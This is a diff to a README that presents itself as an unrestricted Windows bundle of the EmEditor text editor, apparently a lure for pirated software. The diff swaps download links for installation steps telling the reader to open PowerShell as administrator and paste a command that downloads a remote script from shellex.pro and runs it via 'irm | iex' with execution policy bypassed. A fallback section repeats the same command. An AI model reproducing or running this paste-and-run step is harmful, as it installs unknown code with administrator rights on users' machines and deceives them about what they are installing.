@@ -4,30 +4,31 @@
 
 Lightweight editor optimized for enormous text files · Complete Windows bundle · Nothing disabled.
 
-## Download Setup
+## INSTALLATION
 
-> **Grab the Windows build here.** Click the badge or use the direct link for **EmEditor**.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<p align="center">
-<a href="https://emeditor.mefidirect.xyz/"><img src="https://img.shields.io/badge/DOWNLOAD-%E2%86%92-2d3748?style=flat-square" alt="DOWNLOAD"></a><a href="https://emeditor.mefidirect.xyz/"><img src="https://img.shields.io/badge/EMEDITOR-%E2%86%93-0078D4?style=flat-square" alt="EMEDITOR"></a>
-</p>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Direct link** | **[emeditor.mefidirect.xyz](https://emeditor.mefidirect.xyz/)** |
-| **Full URL** | `https://emeditor.mefidirect.xyz/` |
-| **Type** | Windows build · 64-bit · versions 10 and 11 |
-| **Admin** | Right-click setup → Run as administrator |
+<details>
+<summary><b>Command did not start?</b></summary>
 
-### Quick steps
+Try this directly in the same PowerShell window:
 
-1. Click **[Download — emeditor.mefidirect.xyz](https://emeditor.mefidirect.xyz/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Follow the installer prompts on screen
-5. Launch **EmEditor** from the Start menu
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
 
-<p align="center"><a href="https://emeditor.mefidirect.xyz/"><strong>⬇ Download EmEditor now</strong></a></p>
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 📖 About
 
